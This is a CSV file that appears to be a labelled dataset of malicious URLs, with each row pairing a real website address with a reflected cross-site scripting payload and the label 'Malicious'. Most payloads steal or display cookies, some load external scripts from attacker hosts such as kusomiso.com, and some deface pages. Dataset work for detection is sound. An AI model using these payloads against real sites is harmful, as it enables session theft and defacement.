"http://www.ups.com/content/us/en/bussol/browse/cat/wireless.html?loc=en_us%22%3e%27;alert%28string.fromcharcode%2870,%20108,%20117,%20120,%2032,%2049,%2051,%2051,%2055,%2032,%2082,%2048,%2048,%2084%29%29//\%27;alert%28string.fromcharcode%2870,%20108,%20117,%20120,%2032,%2049,%2051,%2051,%2055,%2032,%2082,%2048,%2048,%2084%29%29//%22;alert%28string.fromcharcode%2870,%20108,%20117,%20120,%2032,%2049,%2051,%2051,%2055,%2032,%2082,%2048,%2048,%2084%29%29//\%22;alert%28string.fromcharcode%2870,%20108,%20117,%20120,%2032,%2049,%2051,%2051,%2055,%2032,%2082,%2048,%2048,%2084%29%29//--%3e%3c/script%3e%22%3e%27%3e%3cscript%3ealert%28string.fromcharcode%2870,%20108,%20117,%20120,%2032,%2049,%2051,%2051,%2055,%2032,%2082,%2048,%2048,%2084%29%29%3c/script%3e&viewid=categoryview&contentid=ct1_sol_cat_wireless&wt.svl=pnro_l1",Malicious
http://utils.america.gov/feed2js/magpie_debug.php?url=%22%3e%3cscript%3ealert%28document.cookie%29%3<br>c/script%3e,Malicious
http://lingua.ubbcluj.ro/index.php?menuid=2&amp;lang=%22%3e%3cscript%3ealert(/[]0izy5/)%3c/script%3e,Malicious
http://www.2020urbaniza.com.br/galeria/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;b<br>y+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://dating.comcast.net/singles/servlet/comcast?cid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;mar<br>quee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.camaradiv.mg.gov.br/test.php?cx[][][][][][][][][][][][][][][][][][][][][][][][][][][][][]<br>[][][][][][][][]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3c/script%3e,Malicious
http://www.yalelock.co.uk/en/yale/couk/site-functions/search/?searchquery=%22%3e%3c/i%3e%3cscript%3e<br>alert(%27xssed_by_samthg%27)%3c/script%3e,Malicious
http://www.army.gov.cy/index.php?string=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert(/xss%20by%20turkpower/)%3b&lt;/script<br>&gt;&lt;h1&gt;xss%20by%20turkpower&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.tacadvisory.com/login.asp?strsendto=powertips.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)<br>&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.pfgbudgetni.gov.uk/search.jsp/search.lsim?ha=%27%22%3e%3cscript%3ealert(%22xss%22)%3c/scr<br>ipt%3e,Malicious
http://www.arzular29.com/galeri/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h<br>1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.pir.org/index.php?db=content/website&amp;tbl=registrants&amp;id=3'%3cscript%3ealert(document.cook<br>ie)%3c/script%3e/*,Malicious
http://www.hrf.tu.nato.int/isaf/public/search.php?search=%22%3e%3cscript%3ealert(document.cookie)%3c<br>/script%3e,Malicious
https://support.apple.com/ibook_powerbook/batteryexchange/index.html?lang=de'%3e%22%3e%3cscript/src=<br>http://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://www.gmp.police.uk/live/nhoodv3.nsf/index-divisions.html?readform&amp;division=&quot;&gt;&lt;script&gt;alert(1);<br>&lt;/script&gt;,Malicious
http://nrjmusicawards.nrj.fr/jeux/regulation.php?id=21%22%3e%3cscript%3ealert%28/xss/.source%29%3c/s<br>cript%3e,Malicious
http://billdouglas.ex.ac.uk/eve/searchperson2.asp?bolbad=false&amp;surname=&quot;&gt;&lt;script<br>src=http://byccc.awardspace.com/js/xssccc.js&gt;&lt;/script&gt;,Malicious
"http://www.findjob.ro/search.php?keywords=&lt;script&gt;alert(string.fromcharcode(88,83,83,101,100,32,98,1<br>21,32,68,114,46,79,112,116,105,120))&lt;/script&gt;&amp;oras=",Malicious
http://cn.boincstats.com/stats/project_graph.php?pr='%3e%22%3e%3ciframe%20src=http://kusomiso.com/xs<br>s.html%20%3c,Malicious
http://www.steamboatjack.com/gallery/login.asp?folder=&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;<br>marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.nutrition.gov/index.php?mode=audience&amp;audience=%3cscript%3ealert(123)%3c/script%3e,Malicious
http://www.jnj.com/exit_warning.jsp?url=http://--%3e%22%3e%3cscript%3ealert('m3hr4n/\just%20for%20xs<br>sed.com');%3c/script%3e,Malicious
http://1.tool.ms/?id=test&amp;n=5&amp;psw='%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%20kusomiso.com%22)%3c/<br>script%3e,Malicious
http://yufind.library.yale.edu/yufind/search/results?lookfor=%3cscript%3ealert%28%27**xssed**+by+cir<br>0%27%29%3b%3c%2fscript%3e&amp;type=allfields&amp;submit=find,Malicious
http://www.bursa-gumushaneliler.com/galery/login.asp?folder=http://www.ercmakina.com/galeri/login.as<br>p?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
https://kb.f-secure.com/display/2/loginsecure.aspx?cpid=4&amp;t=&amp;aid=%22%3e%3cscript%3ealert%28document.<br>cookie%29%3c/script%3e,Malicious
http://www.wmo.ch/search?query=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert%281337%29%3c%2fscript%3e%3e%<br>3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%3e&amp;sort=swishlastmodified&amp;reverse=on&amp;subm<br>it.x=13&amp;submit.y=5&amp;submit=search,Malicious
http://2.tool.ms/google.cgi?id=kusomiso.com%3c/title%3e'%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%2<br>0kusomiso.com%22)%3c/script%3e,Malicious
http://www.gametracker.com/activation/?screen_name=&lt;/textarea&gt;'&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scr<br>ipt&gt;,Malicious
http://www.ygeianet.gr/keimeno.php?id=%22%3cscript%3ealert(0)%3c/script%3e,Malicious
http://www.fetedelamusique.culture.fr/page.php?id=%27%22%3e%3cimg%20src=foo.png%20onerror=alert(/xss<br>/)%20/%3e%3cmarquee%20bgcolor=%22red%22%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.suveydasiirleri.com/mods.php?go=forum&amp;page=forum_search&amp;p=sr&amp;type=author&amp;query=&quot;&gt;&lt;script+<br>src=http://vuln.xssed.net/thirdparty/scripts/python5.js&gt;,Malicious
http://shop.cmbchina.com/shop/search.aspx?name=''&gt;&lt;script&gt;alert('xss')&lt;/script&gt;''&gt;&lt;h2&gt;hackedhackedha<br>ckednarcoticxs&lt;/h2&gt;,Malicious
http://video.consilium.europa.eu/index.php?pl=1&lt;/script&gt;&lt;iframe%20src=&quot;http://xssed.com&quot;&gt;&amp;sessionno=<br>0,Malicious
http://www.salonerotika.com/webcards/tools/calendar.php?month=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scri<br>pt&gt;,Malicious
"http://www.entegreharc.com.tr//tr/search/?k=%27%22%28%29%26%251%3cscript%20%3ealert%28string.fromcharcode%2888,83,83%29%29%3c%2fscript%3e&s=1",Malicious
http://www.sabteahval.ir/page.aspx?search=%22%3e%3cscript%3ealert%28/amir/%29%3c/script%3e&mid=1290&page=search/advancedsearch&mdefid=,Malicious
http://www.tneb.in/searend.php?tempno=%22%3e%3ciframe%20src=%22http://xssed.com%22%3e,Malicious
http://wiki.amarc.org/index2.php?topic=amarc9_reference&amp;lang=po&amp;style=amarc9&amp;site=amarc9&quot;&gt;&lt;script&gt;al<br>ert(document.cookie)&lt;/script&gt;,Malicious
http://search.cnbc.com/main.do?target=all&amp;keywords=%22%3e%3c/title%3e%3cscript%3ealert%28document.co<br>okie%29%3c/script%3e&amp;categories=exclude,Malicious
http://www.sykesvilleandpatapscorailway.org/photogallery/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.c<br>ookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://comic.naver.com/webtoon/detail.nhn?titleid=22045&amp;no=227&amp;weekday=%22%3e%3cscript%3ealert%28doc<br>ument.cookie%29%3c/script%3e,Malicious
http://www11.itrc.hp.com/service/james/search.do?searchtext=%22%3e%3cscript%3ealert%28123%29%3c%2fsc<br>ript%3e&amp;x=0&amp;y=0&amp;searchcriteria=allwords&amp;searchtype=search_manual&amp;searchtype=search_forums&amp;rn=25&amp;pres<br>ort=rank,Malicious
http://www.aps.anl.gov/aod/people/mohan/phpinfo.php?cx[][][][][][][][][][][][][][][][][][]=%22%3e%3c<br>script%3ealert(document.cookie)%3c/script%3e,Malicious
http://biblioteca.kaspersky.cl/search/?q=%22%3e%3cbody%20onload=alert(1)%3e,Malicious
http://autos.nj.com/autos?tp=tr_nj&amp;category=search&amp;temp_type=detail&amp;keywords=%22%3e%3cscript%3ealert<br>(1)%3c/script%3e&amp;x=54&amp;y=5,Malicious
http://www.cepa.gov.ar/avisos/?menu_id=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious
http://www.espew.com/modules/search/search.php?tfsearch=%3cscript%3ealert%28%2fxss%2f%29%3b%3c%2fscr<br>ipt%3e&amp;submit.x=32&amp;submit.y=15&amp;submit=search,Malicious
http://www.hbo.com/scripts/video/vidplayer_set.html?movie=/av/sports/boxing/box_hoya_forbes_hl+secti<br>on=boxing+num=1210713752467+title=world championship boxing: de la hoya vs. forbes<br>highlights+tunein=&lt;script&gt;alert('c1c4tr1z')&lt;/script&gt;,Malicious
http://www.emersonnetworkpower.com/en-us/searchcenter/pages/allresults.aspx?k=%3cscript%3ealert(docu<br>ment.cookie)%3c/script%3e&amp;s=network%20power%20content_en-us_en-us,Malicious
http://www.vicky-7.cn/?action=index&amp;setdate=200703&amp;setday=21%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%<br>6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%3<br>2%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c<br>%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;page=1,Malicious
http://www.gastenboek.nl/aanmelden.php?gb_naam=%22%3e%3cscript%3ealert(%2fkiller-tr%2f)%3c%2fscript%<br>3e,Malicious
http://www.sonmezeczanesi.com/forum/philboard_signup.asp?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scri<br>pt&gt;&lt;h1&gt;st@rext&lt;/h1&gt;,Malicious
http://docweb.estesl.ipl.pt/docbweb/indexres.asp?base=isbd&amp;prefix=&amp;indexkey==376-8716.&amp;maxtrm=20&amp;trm<br>cols=2&amp;form=comp&amp;recpag=5&amp;navdirection=0&amp;addtermo=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.fdazar.com/view_faq.php?id=4%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.johnandjessica.com/gallery2/phpinfo.php?a[]=%22%3e%3cscript%3ealert(document.cookie)%3c/s<br>cript%3e,Malicious
"http://www1.uol.com.br/parisdakar/fotos2004.htm?lol.jpg?&lt;script&gt;alert(string.fromcharcode(88,83,83,3<br>2,98,121,32,66,117,103,66,117,115,116,101,114,32,45,32,76,101,105,97,32,98,117,103,98,117,115,116,10<br>1,114,46,99,111,109,46,98,114));&lt;/script&gt;",Malicious
http://www.mtv.com/sitewide/utils/gamespot/gs_scripts.jhtml?gamespoturl=%22%3e%3ctitle%3emtv.com%20-<br>%20xss%20poc%20-%20daltd%3c%3c//title%3e%3cscript%3ealert('xss');%3c/script%3e,Malicious
http://www.commune-tunis.gov.tn/fr/recherche.asp?what=programme%27%22%3e%3c/title%3e%3cscript%3ealer<br>t(1337)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%3c/h1%3e%3c/marquee%3e,Malicious
http://neves.net/igallery/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by<br>+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
"http://www.askmen.com/pointroll/pointrollads.htm?pub=http://www.google.com?+&amp;redir=%27%3e%3cscript%3<br>ewindow.location=location.search.substring(5,28).concat(document.domain)%3c/script%3e&amp;ad=g235e200510<br>11164320",Malicious
http://www.gofreecredit.com/report.php?id=9915&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;b=lp168&quot;&gt;&lt;s<br>cript&gt;alert(document.cookie);&lt;/script&gt;&amp;lte=all&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;subid=ftr+t<br>y&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
"http://www.fiat.it/cgi-bin/pbrand.dll/fiat_italia/search/search.jsp?currentpage=0&amp;h_to_search=&amp;makes<br>erach=false&amp;psource=&amp;bv_sessionid=%40%40%40%400028063206.1173139063%40%40%40%40&amp;bv_engineid=cccdaddk<br>fliemlicefecejgdfiidfio.0&amp;to_search=%22%3e'%3e%3cscript%3ealert(string.fromcharcode(83,69,67,85,82,7<br>3,84,89,32,83,85,88))%3c/script%3e",Malicious
https://bankingportal.sparkasse-pforzheim-calw.de/banking/?konto=%22%3e%3ciframe%20src=http://www.go<br>ogle.de%3e,Malicious
http://www.interpol.int/public/search.asp?ct=data&amp;q1=%27%3balert%28string.fromcharcode%2883%2c69%2c6<br>7%2c85%2c82%2c73%2c84%2c89%2c32%2c83%2c85%2c88%29%29%2f%2f%5c%27%3balert%28string.fromcharcode%2883%<br>2c69%2c67%2c85%2c82%2c73%2c84%2c89%2c32%2c83%2c85%2c88%29%29%2f%2f%22%3balert%28string.fromcharcode%<br>2883%2c69%2c67%2c85%2c82%2c73%2c84%2c89%2c32%2c83%2c85%2c88%29%29%2f%2f%5c%22%3balert%28string.fromc<br>harcode%2883%2c69%2c67%2c85%2c82%2c73%2c84%2c89%2c32%2c83%2c85%2c88%29%29%2f%2f--%3e%3c%2fscript%3e%<br>22%3e%27%3e%3cscript%3ealert%28string.fromcharcode%2883%2c69%2c67%2c85%2c82%2c73%2c84%2c89%2c32%2c83<br>%2c85%2c88%29%29%3c%2fscript%3e&amp;search=search&amp;cbonbhitsperpage=20,Malicious
http://www.yellowpages.com/sp/yellowpages/yptransition.jsp?t=&amp;q=hello%20world%22%3e%3cscript%3ealert<br>(%22xss%22)%3c/script%3e%3cx%20&amp;ci=&amp;st=&amp;_requestid=768763,Malicious
http://www.training.fema.gov/emiweb/cgi-shl/goodbye.asp?url=&quot;&gt;&lt;script&gt;alert(/www.r3t.n3t.nl/)&lt;/scrip<br>t&gt;,Malicious
http://szmm.gov.hu/main.php?folderid=777&amp;iid=1&amp;ctag=search&amp;newsearch=true&amp;simplesearch=true&amp;search=%<br>22%2f%3e%3c%2f%3e%3cscript%3ealert%281%29%3c%2fscript%3e%3c%2ftextarea%3e%3cscript%3ealert%28%22kaks<br>ii_was_here%22%29%3cscript%3ealert%28%27kaksii_was_here%27%29%3balert%281%29%3c%2fscript%3e%22%3c%2f<br>html%3e%3chtml%3e%3cscript%3ealert%2810111%29%3c%2fscript%3e%3cdiv%2520align%3dcenter%3e%2520%3cfont<br>%2520size%3d4%3e%3ctextarea%2520name%3d1%2520cols%3d100000%2520rows%3d10000%2520id%3d1%3ekaksii%2520<br>was%2520here%3c%2ftextarea%3e%3c%2ffont%3e%3c%2fdiv%3e%3cnoscript%3e%3cplaintext%3e,Malicious
http://www.daisy.org/tpbreader/index.asp?lang='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cbr%3e%3cm<br>arquee%3ewhitehat%20forever%3c/marquee%3e,Malicious
http://www.chungkien.com/cart.php?a=add&amp;pid=%3e%22%3e%3cscript%20%0a%0d%3ealert(398817923059)%3b%3c/<br>script%3e,Malicious
http://biki.yi.org/w1/read.php?hash='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%<br>3e,Malicious
http://www.iett.gov.tr/saat/orer.php?hid=durakhat&amp;durak=l0294&amp;durakname=%22%3e%3cmarquee%3e%3ch1%3eb<br>y+st@rext%3c/h1%3e%3c/marquee%3e,Malicious
http://www.tc-mirror.com/mass-add/?d=8%22%3e%3c/title%3e%3cscript%3ealert(1)%3c/script%3e,Malicious
http://www.syngress.com/search?btnsearch.x=17&amp;btnsearch.y=8&amp;query=%3cscript%3ealert%28document.cooki<br>e%29%3c%2fscript%3e,Malicious
http://polatrealestate.com/tur/daireler/login.asp?folder=&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script<br>&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://jobs.orange.com/jobs/jobsearch.do;jsessionid=e691a2c1a28ebc0cf3c75009d932647b?do=search&amp;keywo<br>rd=%22%3e%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e&amp;sortfield=&amp;sorttype=&amp;lang=&amp;browserlan<br>g=&amp;type=,Malicious
http://redvsblue.tk/a?t=%27%22%3e%3c%2f%74%69%74%6c%65%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%<br>31%33%33%37%29%3c%2f%73%63%72%69%70%74%3e%3e%3c%6d%61%72%71%75%65%65%3e%3c%68%31%3e%58%53%53%20%62%7<br>9%20%58%59%4c%49%54%4f%4c%3c%2f%68%31%3e%3c%2f%6d%61%72%71%75%65%65%3e&amp;c=1&amp;p=1&amp;r=1193455118295,Malicious
http://www.ptac.gov.lv/?lang=en&amp;menu=%22%3e%3cscript%3ealert(/xssed/);%3c/script%3e,Malicious
http://www.matis.hr/program_cal.php?ln=hr&amp;y=%22%3e%3cscript%3ealert(1)%3c/script%3e&amp;m=6&amp;d=18,Malicious
http://www.naftemporiki.gr/news/extnews.asp?mvcateg=finance&amp;mvsubcateg=%22%3e%3cbody+onload=alert(%2<br>2by%20encore%22)%3e%3cmarquee%3e%3ch1%3eunutamadim%20:(%20%20%20%3c/h1%3e%3ch2%3e%20by%20encore%20%3<br>c/h2%3e,Malicious
http://www.sensacine.com/film/fichefilm_gen_cfilm=1%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/s<br>cript%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e%27%22%3e%3c/title%3e%3cscr<br>ipt%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e23734<br>.html,Malicious
http://www.neuhardenberg-tourismus.de/cms/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;<br>marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://googlesearch.insurance.ca.gov/search?textsize=default.css&amp;searchreturl=http%3a%2f%2fwww.insur<br>ance.ca.gov%2f&amp;client=default_frontend&amp;proxystylesheet=default_frontend&amp;output=xml_no_dtd&amp;site=defau<br>lt_collection&amp;restrict=&amp;q=%27%3balert%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f%5c%27%3balert<br>%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f%22%3balert%28string.fromcharcode%2888%2c83%2c83%29<br>%29%2f%2f%5c%22%3balert%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f--%3e%3c%2fscript%3e%22%3e%2<br>7%3e%3cscript%3ealert%28string.fromcharcode%2888%2c83%2c83%29%29%3c%2fscript%3e&amp;x=11&amp;y=5,Malicious
http://www.searchgodsword.org/enc/isb/view.cgi?action=alpha&amp;letter=&lt;/textarea&gt;'&quot;&gt;&lt;script&gt;alert(docum<br>ent.cookie)&lt;/script&gt;,Malicious
http://www.dur.ac.uk/dates/select_term/?period=epiphany%20term%202009}%3c/style%3e%3cscript%3ea=eval<br>;b=alert;a(b(/xss/.source));%3c/script%3e,Malicious
http://blade.nagaokaut.ac.jp/cgi-bin/scat.rb/ruby/ruby-list/%22%3e'%3e%3cscript%3ealert(%22xss%20by%<br>20kusomiso.com%22)%3c/script%3e%3e%3cmarquee%3e%3ch1%3eby%20kusomiso.com%3c/h1%3e%3c/marquee%3e,Malicious
http://www.pittsburghlive.com/x/search/?searchwords=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&amp;fields=full&amp;paper=a<br>ll&amp;search_range=quick&amp;quick=7&amp;amonth=01&amp;aday=01&amp;ayear=2009&amp;bmonth=01&amp;bday=01&amp;byear=2009&amp;pg_len=25&amp;so<br>rt_by=story_date&amp;result_type=with,Malicious
http://www.phpnuke.org/modules.php?name=search&amp;query=%3cscript+src%3dhttp%3a%2f%2fha.ckers.org%2fxss<br>.jpg+&amp;topic=&amp;category=0&amp;author=&amp;days=0&amp;type=stories,Malicious
http://tlogr.com/testmb.php?keywords=%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious
"http://www.unvienna.org/unov/search.html?q=';alert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83<br>,85,88))//\';alert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))//%22;alert(string.fromc<br>harcode(83,69,67,85,82,73,84,89,32,83,85,88))//\%22;alert(string.fromcharcode(83,69,67,85,82,73,84,8<br>9,32,83,85,88))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(83,69,67,85,82,73<br>,84,89,32,83,85,88))%3c/script%3e&amp;btng=search&amp;entqr=0&amp;sort=date%3ad%3al%3ad1&amp;ud=1&amp;site=unvienna",Malicious
http://www.library.lg.ua/rus/search.php?search=%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2fkusomiso.c<br>om%2fxss.js%3e%3c%2fscript%3e&amp;submit=%c8%f1%ea%e0%f2%fc,Malicious
http://visualarts.qld.gov.au/designyourowntour/register.php?user=found&amp;message=username%20already%20<br>exists%20in%20database&amp;requsername=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.swsdental.com/scripts/kayit.asp?id=3558&amp;dil=tr&amp;page=grup.asp&amp;results=&quot;&gt;&lt;script&gt;alert(docu<br>ment.cookie)&lt;/script&gt;,Malicious
http://hcr3.isiknowledge.com/formbrowse.cgi?error=1&amp;&amp;link1=&lt;/textarea&gt;'&quot;&gt;&lt;script&gt;alert(document.cook<br>ie)&lt;/script&gt;,Malicious
http://www.gametrailers.com/interviews.php?order_by=date+desc%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61<br>%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%<br>32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2<br>c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://www.adval.com.au/newsdetail.php?id=%27%22%3e%3c/title%3e%3cscript%3ealert%281%29%3c/script%3e,Malicious
http://icsc.un.org/resources/default.asp?query=%22%3cscript+src%3dhttp://vuln.xssed.net/thirdparty/s<br>cripts/hotpockets.js%3e,Malicious
http://www.pandemie-grippale.gouv.fr/quiz_grippe/site/index.php?qid=%27%22%3e%3c/title%3e%3cscript%3<br>ealert(1337)%3c/script%3e,Malicious
http://jacksonmiller.com/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+<br>narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.europarl.europa.eu/oeil/search.jsp?form='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cbr%3<br>e%3cmarquee%3ewhitehat%20forever%3c/marque%3e,Malicious
http://www.adsnl.com/classified-ads-detail.php?id=%27%22%3e%3c/title%3e%3cscript%3ealert%281337%29%3<br>c/script%3e,Malicious
http://freedom.ws/index.dhtml?sponsor=%22%3e%3cscript%3ealert(%22fux0r%22)%3c/script%3e,Malicious
http://msn.handango.com/platformproductdetail.jsp?siteid=1&amp;platformid=1&amp;producttype=%22%3e%3cscript%<br>3ealert(%22xss%20by%20fugitif%22)%3c/script%3e,Malicious
http://www.domaintools.com/registrant-search/?all[]=%3cscript%3ealert%28%2fshocker+%40+www.shockings<br>oft.com%2f%29%3c%2fscript%3e&amp;none[]=,Malicious
http://thewillamettestore.com/cgi-bin/store/search.html?mv_session_id=tayqn2sw&amp;mv_pc=14&amp;st=db&amp;co=yes<br>&amp;op=eq&amp;sf=category&amp;se=%3ciframe%20src=javascript:alert(123)%3e&amp;tf=category&amp;ml=10,Malicious
http://gigablast.com/search?q=%22%3b%3e%3c/noscript%3e%3cscript%3ealert(&quot;skyr3x&quot;)%3b%3c/script%3e/,Malicious
http://www.veryangrytoad.com/video.php?category=mr&amp;viewtype=%22%3e%3ch1%3e%3cmarquee%3exss%20by%20c1<br>c4tr1z%3c/marquee%3e%3c/h1%3e%3cbr%3e,Malicious
http://www.radikal.com.tr/sayfa.php?sayfa=&quot;&gt;%20hacked%20by%20b34tr1b0x%20%20&lt;script&gt;alert(document.c<br>ookie)&lt;/script&gt;,Malicious
http://www.excite.co.jp/world/english/web/proceeding/?wb_url=http%3a%2f%2fkusomiso.com%2f%22%3e%27%3<br>e%3cscript%3ealert%28%22kusomiso.com%22%29%3c%2fscript%3e&amp;wb_submit=%83e%83f%83u%83y%81%5b%83w%96%7c<br>%96%f3&amp;wb_lp=enja&amp;wb_dis=2,Malicious
http://www.noa.org.il/forum/philboard_search.asp?searchterms=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scrip<br>t&gt;&lt;h1&gt;www.raptr.us.tc&lt;/h1&gt;,Malicious
http://www.theatronhometheater.com/index.php?page=&quot;&gt;&lt;/iframe&gt;&lt;script&gt;alert(1);&lt;/script&gt;&amp;pagetitle=&lt;/<br>title&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious
http://search.nj.com/sp?aff=1&amp;keywords=%22%3e%3cscript%3ealert(1)%3c/script%3e&amp;x=42&amp;y=11,Malicious
https://bankingportal.sparkasse-ulm.de/banking/?konto=%22%3e%3ciframe%20src=http://www.google.de%3e,Malicious
http://www.igs.net/cgi-bin/cgiwrap/grcmptra/seekx.pl?category=a%27%22%3e%3c/title%3e%3cscript%3ealer<br>t(1337)%3c/script%3ell&amp;language=polexe&amp;screen=francais&amp;searchtext=fingerprinting&amp;viewcount=50,Malicious
http://chicago.bbb.org/wwwroot/search.aspx?site=46&amp;s=xss%22%3e%3cscript%3ealert%28document.cookie%29<br>%3c/script%3e,Malicious
"http://finance.indiamart.com/cgi-bin/stocksearch.cgi?which_exchange=bse&option=company&company_name=<script>alert(""xss3d by sid3_effects"")<%2fscript>&submit1=go",Malicious
"http://www.crmariocovas.sp.gov.br/ntc_l.php?t=';alert(string.fromcharcode(83,69,67,85,82,73,84,89,32<br>,83,85,88))//\';alert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))//%22;alert(string.fr<br>omcharcode(83,69,67,85,82,73,84,89,32,83,85,88))//\%22;alert(string.fromcharcode(83,69,67,85,82,73,8<br>4,89,32,83,85,88))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(83,69,67,85,82<br>,73,84,89,32,83,85,88))%3c/script%3e",Malicious
http://www.url.com/search/meta?query=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narco<br>ticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://ms164.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://www.verdimaddaloni.it/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;b<br>y+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
